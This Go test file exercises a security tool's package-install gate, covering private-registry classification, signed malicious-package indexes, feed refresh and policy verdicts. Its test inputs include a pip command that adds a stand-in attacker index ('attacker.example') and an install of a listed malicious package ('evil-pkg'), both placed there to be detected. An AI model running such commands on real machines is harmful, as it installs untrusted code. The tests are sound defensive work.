//go:build !sbo_omit_security && !sbo_omit_security_deps

package main

import (
	"context"
	"crypto/ed25519"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/marmutapp/superbased-observer/internal/componentstate"
	"github.com/marmutapp/superbased-observer/internal/config"
	"github.com/marmutapp/superbased-observer/internal/contentchan"
	"github.com/marmutapp/superbased-observer/internal/hookctx"
	"github.com/marmutapp/superbased-observer/internal/localipc"
	"github.com/marmutapp/superbased-observer/internal/policy"
	"github.com/marmutapp/superbased-observer/internal/secask"
	"github.com/marmutapp/superbased-observer/internal/secfeed"
	"github.com/marmutapp/superbased-observer/internal/secfeed/online"
	"github.com/marmutapp/superbased-observer/internal/secposture"
	"github.com/marmutapp/superbased-observer/internal/update/content"
)

// security_deps_fix_test.go holds the lane sec-d1fix tests of the install
// gate's cmd wiring (plans decision log P-020).

// TestHookCommandPrivateNeverAsked is X4 end to end through the hook: an
// install that names a private index (a flag, a variable, an export) is
// never asked about, so the daemon never looks it up and nothing reaches a
// public source.
func TestHookCommandPrivateNeverAsked(t *testing.T) {
	if !localipc.Supported() {
		t.Skip("no local IPC")
	}
	base, err := os.MkdirTemp("", "dx")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.RemoveAll(base) }()
	cfgPath := filepath.Join(base, "config.toml")
	dir := secposture.LayoutFor(cfgPath).Dir
	installTestIndex(t, depsContentStore(cfgPath).Root)
	var looked atomic.Int64
	svc := secfeed.NewService(secfeed.ServiceOptions{
		Classify: func(secfeed.Scope) secfeed.Classifier { return secfeed.NewClassifier(secfeed.PrivConfig{}) },
		Lookup: func(_ context.Context, specs []secfeed.InstallSpec) []secfeed.OnlineAnswer {
			looked.Add(int64(len(specs)))
			return nil
		},
		Enabled: func() bool { return true },
	})
	ln, _, err := secask.Listen(dir)
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = secask.Serve(ctx, ln, svc.Answer) }()
	if err := writeDepsSettings(dir, config.Default(), true); err != nil {
		t.Fatal(err)
	}
	for _, cmd := range []string{
		"pip install --extra-index-url https://attacker.example/simple internal-pkg",
		"pip install --index-url https://pypi.corp.example/simple internal-pkg",
		"PIP_INDEX_URL=https://pypi.corp.example/simple pip install internal-pkg",
		"export PIP_INDEX_URL=https://pypi.corp.example/simple && pip install internal-pkg",
		"npm install --registry https://npm.corp.example internal-pkg",
		"NPM_CONFIG_REGISTRY=https://npm.corp.example npm i internal-pkg",
		"cargo install --registry corp internal-pkg",
		"GOPRIVATE=corp.example go get corp.example/team/internal-pkg",
	} {
		res, err := securityInstallChecker(cfgPath)(context.Background(), hookctx.InstallRequest{
			ProjectRoot: base, Event: &policy.Event{Kind: policy.KindShellExec, Target: cmd},
		})
		if err != nil {
			t.Fatal(err)
		}
		if !res.CustomRegistry || len(res.Checks) != 1 || !res.Checks[0].Private {
			t.Errorf("%s: %+v", cmd, res)
		}
	}
	if looked.Load() != 0 {
		t.Errorf("a command-private name was looked up %d times", looked.Load())
	}
}

// TestDepsPrivInputUnreadable: a configuration file that exists but cannot
// be read (here: a directory where the file should be) makes its
// ecosystem private; a missing one does not.
func TestDepsPrivInputUnreadable(t *testing.T) {
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, ".npmrc"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "requirements-dev.txt"), []byte("--extra-index-url https://pypi.corp.example/simple\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	in := depsPrivInput(root, nil, nil)
	if !in.Unreadable[secfeed.ConfNpmrcProject] {
		t.Errorf("unreadable %+v", in.Unreadable)
	}
	cls := hookDepsClassifier(secfeed.Scope{ProjectRoot: root})
	if cls(secfeed.ParseSpec(secfeed.EcoNpm, "left-pad")) {
		t.Error("an unreadable .npmrc must make npm names private")
	}
	if cls(secfeed.ParseSpec(secfeed.EcoPyPI, "requests")) {
		t.Error("a requirements file's extra index must make PyPI names private")
	}
	if !cls(secfeed.ParseSpec(secfeed.EcoCargo, "serde")) && os.Getenv("CARGO_HOME") == "" {
		// Cargo has no project file here; the user's own ~/.cargo may
		// still replace crates-io on the machine running the test.
		t.Log("cargo private on this machine (a user config)")
	}
}

// TestDepsLookupTenancyPerCall is X19 per lookup (milestone 2d): the
// tenancy is read on every lookup, an unreadable tenancy makes no lookup
// of either kind, and a node that enrols as managed while running stops
// using the public client at once.
func TestDepsLookupTenancyPerCall(t *testing.T) {
	var tenancy atomic.Int64
	var publicCalls, relayCalls atomic.Int64
	answer := func(n *atomic.Int64) func() secfeed.Lookup {
		return func() secfeed.Lookup {
			return func(_ context.Context, specs []secfeed.InstallSpec) []secfeed.OnlineAnswer {
				n.Add(1)
				var out []secfeed.OnlineAnswer
				for _, s := range specs {
					out = append(out, secfeed.OnlineAnswer{Eco: s.Eco, Name: s.Name, Status: secfeed.OnlineAnswered})
				}
				return out
			}
		}
	}
	lk := depsLookupFor(func(context.Context) depsTenancy { return depsTenancy(tenancy.Load()) }, answer(&publicCalls), answer(&relayCalls))
	specs := []secfeed.InstallSpec{secfeed.ParseSpec(secfeed.EcoNpm, "left-pad")}

	tenancy.Store(int64(depsTenancyUnknown))
	got := lk(context.Background(), specs)
	if publicCalls.Load()+relayCalls.Load() != 0 || len(got) != 1 || got[0].Status != secfeed.OnlineFailed {
		t.Fatalf("unknown tenancy looked something up: %+v", got)
	}
	tenancy.Store(int64(depsIndividual))
	_ = lk(context.Background(), specs)
	if publicCalls.Load() != 1 {
		t.Fatal("an individual node uses the public client")
	}
	tenancy.Store(int64(depsManaged))
	for range 3 {
		_ = lk(context.Background(), specs)
	}
	if publicCalls.Load() != 1 || relayCalls.Load() != 3 {
		t.Errorf("after enrolling as managed: public=%d relay=%d", publicCalls.Load(), relayCalls.Load())
	}
}

// installSignedKind signs and installs one index kind with the given data
// under the test key installTestIndex set up.
func installSignedKind(t *testing.T, st contentchan.Store, priv ed25519.PrivateKey, kind content.Kind, name string, data []byte, version int64) {
	t.Helper()
	m, err := secfeed.BuildManifest(secfeed.ManifestInput{Kind: kind, ManifestVersion: version, Issued: time.Now().Add(-time.Minute), Validity: 7 * 24 * time.Hour, Name: name, Data: data})
	if err != nil {
		t.Fatal(err)
	}
	env, err := content.Sign(m, priv)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := content.EncodeEnvelope(env)
	if _, err := st.Install(kind, b, map[string][]byte{name: data}, depsTrust()); err != nil {
		t.Fatal(err)
	}
}

// TestInstallIndexVerifiedOnce is milestone 3e: the hook verifies a large
// malicious list once per index version and then reads it through the
// sidecar without hashing or parsing it; an artifact changed after the
// record (a different modification time or size) is verified in full
// again and refused when its digest no longer matches. It logs the timings
// (the lane report quotes them).
func TestInstallIndexVerifiedOnce(t *testing.T) {
	_, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	pub := priv.Public().(ed25519.PublicKey)
	prev := depsTrust
	depsTrust = func() contentchan.Trust { return contentchan.Trust{VendorKeys: []ed25519.PublicKey{pub}} }
	t.Cleanup(func() { depsTrust = prev })
	cfg := filepath.Join(t.TempDir(), "config.toml")
	st := depsContentStore(cfg)
	var es []secfeed.MaliciousEntry
	for i := range 250000 {
		es = append(es, secfeed.MaliciousEntry{Eco: secfeed.EcoNpm, Name: fmt.Sprintf("pkg-%07d-a-longer-package-name", i), IDs: []string{fmt.Sprintf("MAL-2025-%d", i)}, Versions: []string{"1.0.0", "1.0.1"}})
	}
	data := secfeed.EncodeMalicious(es)
	installSignedKind(t, st, priv, content.MaliciousPackages, secfeed.MaliciousArtifact, data, 1)

	start := time.Now()
	ix, fresh := loadInstallIndexCached(st, depsTrust())
	first := time.Since(start)
	if fresh != content.Fresh || !ix.Lookup(secfeed.EcoNpm, "pkg-0123456-a-longer-package-name", "1.0.0").Malicious {
		t.Fatalf("first load: %s", fresh)
	}
	start = time.Now()
	ix, _ = loadInstallIndexCached(st, depsTrust())
	second := time.Since(start)
	if !ix.Lookup(secfeed.EcoNpm, "pkg-0123456-a-longer-package-name", "1.0.1").Malicious {
		t.Fatal("second load")
	}
	start = time.Now()
	full, _ := loadInstallIndex(st, depsTrust())
	parsed := time.Since(start)
	if !full.Lookup(secfeed.EcoNpm, "pkg-0000001-a-longer-package-name", "1.0.0").Malicious {
		t.Fatal("full load")
	}
	t.Logf("%d bytes: first (verify and record) %v, later installs %v; a full verify without the sidecar %v", len(data), first, second, parsed)

	// Tamper: other bytes and a new modification time are verified again
	// and refused (the digest no longer matches), never trusted.
	dir, _ := st.KindDir(content.MaliciousPackages)
	path := filepath.Join(dir, secfeed.MaliciousArtifact)
	bad := append([]byte(nil), data...)
	bad[len(bad)-2] ^= 1
	if err := os.WriteFile(path, bad, 0o600); err != nil {
		t.Fatal(err)
	}
	future := time.Now().Add(time.Hour)
	_ = os.Chtimes(path, future, future)
	if _, fresh := loadInstallIndexCached(st, depsTrust()); fresh != content.Unknown {
		t.Errorf("a changed artifact must read unknown, got %s", fresh)
	}
}

// feedServer serves a signed two-kind index the way the vendor feed does,
// and counts every request by path.
func feedServer(t *testing.T, publish bool) (*httptest.Server, *sync.Map) {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	pub := priv.Public().(ed25519.PublicKey)
	prev := depsTrust
	depsTrust = func() contentchan.Trust { return contentchan.Trust{VendorKeys: []ed25519.PublicKey{pub}} }
	t.Cleanup(func() { depsTrust = prev })
	mal, _ := secfeed.MaliciousFromOSV([][]byte{[]byte(`{"id":"MAL-1","affected":[{"package":{"ecosystem":"npm","name":"evil-pkg"}}]}`)})
	popl, _ := secfeed.PopularFromList(secfeed.EcoNpm, []byte("react\nlodash\n"))
	files := map[string][]byte{}
	for _, k := range []struct {
		kind content.Kind
		name string
		data []byte
	}{
		{content.MaliciousPackages, secfeed.MaliciousArtifact, secfeed.EncodeMalicious(mal)},
		{content.PopularNames, secfeed.PopularArtifact, secfeed.EncodePopular(map[secfeed.Ecosystem][]string{secfeed.EcoNpm: popl})},
	} {
		m, err := secfeed.BuildManifest(secfeed.ManifestInput{Kind: k.kind, ManifestVersion: 1, Issued: time.Now().Add(-time.Minute), Validity: 7 * 24 * time.Hour, Name: k.name, Data: k.data})
		if err != nil {
			t.Fatal(err)
		}
		env, err := content.Sign(m, priv)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := content.EncodeEnvelope(env)
		files["/api/security/v1/content/"+string(k.kind)+"/"+contentchan.ManifestFile] = b
		files["/api/security/v1/content/"+string(k.kind)+"/"+k.name] = k.data
	}
	var hits sync.Map
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n, _ := hits.LoadOrStore(r.URL.Path, new(atomic.Int64))
		n.(*atomic.Int64).Add(1)
		b, ok := files[r.URL.Path]
		if !ok || !publish {
			http.NotFound(w, r)
			return
		}
		tag := `"` + content.HashBytes(b)[:16] + `"`
		w.Header().Set("ETag", tag)
		if r.Header.Get("If-None-Match") == tag {
			w.WriteHeader(http.StatusNotModified)
			return
		}
		_, _ = w.Write(b)
	}))
	t.Cleanup(srv.Close)
	return srv, &hits
}

// TestFeedDownloadsWithOnlineOff is milestone 3c on a config with no
// [components] block: with online checks off the daemon still downloads
// and installs the signed offline index (a plain download of public
// files), verifies it once for the hook, and sends no query about any
// package.
func TestFeedDownloadsWithOnlineOff(t *testing.T) {
	srv, hits := feedServer(t, true)
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	if err := os.WriteFile(cfgPath, []byte("[observer]\ndb_path = \""+filepath.ToSlash(filepath.Join(dir, "observer.db"))+"\"\n\n[security.deps]\nonline = false\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	rt := &depsRuntime{configPath: cfgPath, client: func() *online.Client {
		eps := map[string]string{online.FeedHost: srv.URL, online.OSVHost: srv.URL}
		for _, e := range secfeed.Ecosystems() {
			eps[e.MetadataHost] = srv.URL
		}
		return online.New(online.Options{HTTP: srv.Client(), Endpoints: eps})
	}}
	if err := rt.feedOnce(context.Background()); err != nil {
		t.Fatalf("feed: %v", err)
	}
	st := depsContentStore(cfgPath)
	for _, k := range depsFeedKinds {
		if s, err := st.State(k.kind); err != nil || s.Accepted == nil {
			t.Errorf("%s not installed: %v", k.kind, err)
		}
	}
	if _, err := os.Stat(filepath.Join(secposture.LayoutFor(cfgPath).Dir, depsVerifiedFile)); err != nil {
		t.Errorf("the daemon did not verify the index for the hook: %v", err)
	}
	// A second refresh revalidates each envelope with its ETag (one 304
	// each) and downloads no artifact again.
	count := func(p string) int64 {
		n, ok := hits.Load(p)
		if !ok {
			return 0
		}
		return n.(*atomic.Int64).Load()
	}
	malPath := "/api/security/v1/content/" + string(content.MaliciousPackages) + "/" + secfeed.MaliciousArtifact
	before := count(malPath)
	if err := rt.feedOnce(context.Background()); err != nil {
		t.Fatalf("second feed: %v", err)
	}
	if count(malPath) != before {
		t.Error("an unchanged feed downloaded the artifact again")
	}
	if tags := readDepsFeedETags(st); tags[string(content.MaliciousPackages)] == "" {
		t.Errorf("no ETag kept: %v", tags)
	}
	hits.Range(func(k, _ any) bool {
		if p := k.(string); !strings.HasPrefix(p, "/api/security/v1/content/") {
			t.Errorf("online off sent a package query: %s", p)
		}
		return true
	})
	// The hook now decides from the offline index, with online off.
	res, err := securityInstallChecker(cfgPath)(context.Background(), hookctx.InstallRequest{Event: &policy.Event{Kind: policy.KindShellExec, Target: "npm install evil-pkg", SessionID: "s1"}})
	if err != nil || len(res.Checks) != 1 || res.Checks[0].Verdict != policy.InstallMalicious {
		t.Errorf("offline verdict with online off: %+v %v", res, err)
	}
}

// TestFeedBackoff is milestone 3d: a feed that is not published yet is
// noted once and retried at the normal cadence; a real failure backs off
// from 15 minutes up to 6 hours and warns only when the failure changes.
func TestFeedBackoff(t *testing.T) {
	var b depsFeedBackoff
	notPub := fmt.Errorf("security.malicious_packages: %w", online.ErrFeedNotPublished)
	wait, msg, _ := b.next(notPub)
	if wait != depsFeedEvery || msg == "" {
		t.Errorf("first not-published: %v %q", wait, msg)
	}
	for range 5 {
		if wait, msg, _ = b.next(notPub); wait != depsFeedEvery || msg != "" {
			t.Errorf("repeat not-published: %v %q", wait, msg)
		}
	}
	other := errors.New("dns")
	var waits []time.Duration
	logged := 0
	for range 7 {
		w, m, _ := b.next(other)
		waits = append(waits, w)
		if m != "" {
			logged++
		}
	}
	want := []time.Duration{15 * time.Minute, 30 * time.Minute, time.Hour, 2 * time.Hour, 4 * time.Hour, 6 * time.Hour, 6 * time.Hour}
	for i := range want {
		if waits[i] != want[i] {
			t.Errorf("back-off %d: %v, want %v", i, waits[i], want[i])
		}
	}
	if logged != 1 {
		t.Errorf("a repeated failure warned %d times", logged)
	}
	if w, _, _ := b.next(nil); w != depsFeedEvery {
		t.Error("success resets to the normal cadence")
	}
}

// TestFeedNotPublishedIsNotAFault drives the real client against a feed
// that answers 404.
func TestFeedNotPublishedIsNotAFault(t *testing.T) {
	srv, _ := feedServer(t, false)
	c := online.New(online.Options{HTTP: srv.Client(), Endpoints: map[string]string{online.FeedHost: srv.URL}})
	err := fetchAndInstallKind(context.Background(), c, contentchan.Store{Root: t.TempDir()}, content.MaliciousPackages, secfeed.MaliciousArtifact)
	if !errors.Is(err, online.ErrFeedNotPublished) {
		t.Errorf("404: %v", err)
	}
}

// TestNotSetUpQuietNote is milestone 3a on a config with no [components]
// block: with no signed index ever installed and online checks not
// disclosed, an install raises one quiet S-744 note per session and is
// otherwise not checked, never an S-744 flag on every install.
func TestNotSetUpQuietNote(t *testing.T) {
	cfgPath := filepath.Join(t.TempDir(), "config.toml")
	check := securityInstallChecker(cfgPath)
	depsScopeHome(t)
	proj := t.TempDir()
	run := func(session, cmd string) []policy.InstallCheck {
		res, err := check(context.Background(), hookctx.InstallRequest{ProjectRoot: proj, Event: &policy.Event{Kind: policy.KindShellExec, Target: cmd, SessionID: session, Cwd: proj}})
		if err != nil {
			t.Fatal(err)
		}
		return res.Checks
	}
	flagged := func(cs []policy.InstallCheck) int {
		n := 0
		for _, c := range cs {
			if c.Verdict != policy.InstallNotChecked {
				n++
			}
		}
		return n
	}
	if got := run("s1", "npm install left-pad lodahs"); flagged(got) != 1 || got[0].Reason != secfeed.ReasonNotSetUp {
		t.Errorf("first install of a session: %+v", got)
	}
	for range 3 {
		if got := run("s1", "npm install other-pkg"); flagged(got) != 0 {
			t.Errorf("a later install of the same session: %+v", got)
		}
	}
	if got := run("s2", "pip install requests"); flagged(got) != 1 {
		t.Errorf("another session gets its own note: %+v", got)
	}
	// Online checks on and accepted: the full gate runs (here with no
	// index and no daemon: unknown and online_unknown, as before).
	dir := secposture.LayoutFor(cfgPath).Dir
	if err := writeDepsSettings(dir, config.Default(), false); err != nil {
		t.Fatal(err)
	}
	if _, err := recordDepsDisclosure(dir, "dashboard", time.Now()); err != nil {
		t.Fatal(err)
	}
	if got := run("s1", "npm install other-pkg"); len(got) != 1 || got[0].Verdict != policy.InstallUnknownName || got[0].Reason == secfeed.ReasonNotSetUp {
		t.Errorf("set up: %+v", got)
	}
}

// TestOfferedToAnInstallWithNoComponentsBlock is milestone 4: with the
// component offered, an install whose config has no [components] block
// (every existing install) runs the install gate. It proves what that
// install sees, with Guard in observe and in enforce, for `npm install
// left-pad`, a private-registry install and a listed malicious package:
// first with nothing set up (no signed index, online checks waiting for
// the disclosure), then with the signed index installed.
//
// It drives an install that selects the component in a block;
// TestDepsOfferedWithNoComponentsBlock covers an install with no block,
// which runs it since the offer (lane sec-deps4, P-036).
func TestOfferedToAnInstallWithNoComponentsBlock(t *testing.T) {
	snap := componentstate.Resolve(config.ComponentsConfig{Add: []string{securityDepsComponent}}, nil)
	if !securitySelected(snap, securityDepsComponent) {
		t.Fatal("security.deps is not selected although a [components] block adds it")
	}
	packs := securityActivePacks(snap)
	if !slices.Contains(packs, securityDepsComponent) {
		t.Fatalf("packs %v", packs)
	}
	rules := securityPackRules(func(id string) bool { return securitySelected(snap, id) }, nil)
	engines := map[policy.Mode]*policy.Engine{}
	for _, m := range []policy.Mode{policy.ModeObserve, policy.ModeEnforce} {
		eng, err := policy.New(policy.Config{Mode: m, Home: "/home/u", ExtraRules: rules})
		if err != nil {
			t.Fatal(err)
		}
		engines[m] = eng
	}
	cfgPath := filepath.Join(t.TempDir(), "config.toml")
	if err := os.WriteFile(cfgPath, []byte("[components]\nadd = [\"security.deps\"]\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	decide := func(session, cmd string) map[policy.Mode]policy.Verdict {
		ev := policy.Event{
			Kind: policy.KindShellExec, Target: cmd, ActionType: "run_command", SessionID: session, Cwd: "/r", ProjectRoot: "/r",
			Caps: policy.Capabilities{PreExecution: true, CanBlock: true, CanAsk: true}, Now: time.Unix(1, 0),
		}
		res, err := securityInstallChecker(cfgPath)(context.Background(), hookctx.InstallRequest{Event: &ev})
		if err != nil {
			t.Fatal(err)
		}
		sec := &policy.Security{Posture: policy.SecurityPostureClean, Packs: packs, Installs: res.Checks, InstallCustomRegistry: res.CustomRegistry, InstallManifest: res.Manifest}
		sec.Install, sec.InstallSource = secfeed.Summarize(res.Checks)
		ev.Security = sec
		out := map[policy.Mode]policy.Verdict{}
		for m, eng := range engines {
			out[m] = eng.Evaluate(ev)
		}
		return out
	}
	type want struct {
		rule             string
		observe, enforce policy.Decision
	}
	check := func(stage, session, cmd string, w want) {
		t.Helper()
		got := decide(session, cmd)
		for m, d := range map[policy.Mode]policy.Decision{policy.ModeObserve: w.observe, policy.ModeEnforce: w.enforce} {
			if got[m].Decision != d || got[m].RuleID != w.rule {
				t.Errorf("%s, %s, %q: %s by %q, want %s by %q", stage, m, cmd, got[m].Decision, got[m].RuleID, d, w.rule)
			}
		}
	}
	const (
		leftPad = "npm install left-pad"
		private = "npm install --registry https://npm.corp.example internal-lib"
		evil    = "npm install evil-pkg"
	)
	// Nothing set up yet (the feed is not published, the disclosure not
	// accepted): one quiet note per session, nothing louder; S-745 stays
	// quiet until the gate is set up (lane SEC-D1FIX2 milestone 2d).
	check("not set up", "s1", leftPad, want{"S-744", policy.DecisionFlag, policy.DecisionFlag})
	check("not set up", "s1", leftPad, want{"", policy.DecisionAllow, policy.DecisionAllow})
	check("not set up", "s1", private, want{"", policy.DecisionAllow, policy.DecisionAllow})
	check("not set up", "s1", evil, want{"", policy.DecisionAllow, policy.DecisionAllow})

	// The signed index installed (the feed or an import), online checks
	// still waiting: the offline list decides; nothing is asked online.
	installTestIndex(t, depsContentStore(cfgPath).Root)
	check("index installed", "s2", leftPad, want{"", policy.DecisionAllow, policy.DecisionAllow})
	check("index installed", "s2", private, want{"S-745", policy.DecisionFlag, policy.DecisionFlag})
	check("index installed", "s2", evil, want{"S-741", policy.DecisionAsk, policy.DecisionDeny})
	check("index installed", "s2", "npm install --registry https://npm.corp.example evil-pkg", want{"S-741", policy.DecisionAsk, policy.DecisionDeny})

	// The dashboard seam on the same install: active, accept records the
	// dashboard surface.
	dash := packageChecksDash(cfgPath, nil)
	st, err := dash.Status(context.Background())
	if err != nil || !st.Active || st.Accepted || st.NotSetUp {
		t.Fatalf("dashboard status %+v %v", st, err)
	}
	if err := dash.Accept(context.Background()); err != nil {
		t.Fatal(err)
	}
	if st, _ := dash.Status(context.Background()); !st.Accepted || st.AcceptedOn != "dashboard" {
		t.Errorf("after accept %+v", st)
	}
}

// TestDepsDoctorRow: the doctor row on an install that selects the
// component says it is active and, with nothing installed, that package
// checks are not set up yet.
func TestDepsDoctorRow(t *testing.T) {
	dir := t.TempDir()
	cfgPath := filepath.Join(dir, "config.toml")
	dbPath := filepath.Join(dir, "observer.db")
	body := "[observer]\ndb_path = " + strconv.Quote(dbPath) + "\n[components]\nadd = [\"security.deps\"]\n"
	if err := os.WriteFile(cfgPath, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c := securityDepsDoctorCheck(context.Background(), cfgPath)
	if !strings.Contains(c.Message, "not set up yet") || len(c.Details) != 5 || !strings.Contains(c.Details[0], "no database yet") {
		t.Errorf("doctor %+v", c)
	}
	if _, err := os.Stat(dbPath); err == nil {
		t.Error("the doctor created a database")
	}
	// With a database, the doctor reads the tenancy as a lookup does
	// (lane SEC-D1FIX2 milestone 2f).
	_, database, cleanup, err := loadConfigAndDB(context.Background(), cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	_ = database
	cleanup()
	c = securityDepsDoctorCheck(context.Background(), cfgPath)
	if !strings.HasPrefix(c.Details[0], "node: individual") {
		t.Errorf("doctor tenancy %+v", c.Details)
	}
}
